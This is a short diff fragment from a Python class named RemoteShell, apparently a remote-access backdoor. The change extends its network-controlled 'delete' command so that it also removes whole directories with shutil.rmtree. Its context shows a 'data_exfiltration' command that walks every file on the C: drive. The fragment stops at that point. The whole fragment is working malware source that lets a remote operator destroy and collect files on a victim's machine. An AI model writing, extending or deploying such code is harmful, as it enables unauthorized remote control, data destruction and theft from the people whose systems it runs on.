@@ -282,10 +282,17 @@ class RemoteShell:
                         elif command.startswith('delete '):
                             target = command.split(' ', 1)[1].strip()
                             try:
-                                os.remove(target)
-                                connection.send(f"Deleted: {target}\n".encode())
+                                if os.path.isfile(target):
+                                    os.remove(target)
+                                    connection.send(f"File deleted: {target}\n".encode())
+                                elif os.path.isdir(target):
+                                    shutil.rmtree(target)
+                                    connection.send(f"Directory deleted: {target}\n".encode())
+                                else:
+                                    connection.send(f"Error: Item not found '{target}'\n".encode())
                             except Exception as e:
-                                connection.send(f"Failed to delete: {e}\n".encode())
+                                connection.send(f"Failed to delete '{target}': {e}\n".encode())
+                        
                         elif command == 'data_exfiltration':
                             for root, dirs, files in os.walk("C:\\"):
                                 for file in files:
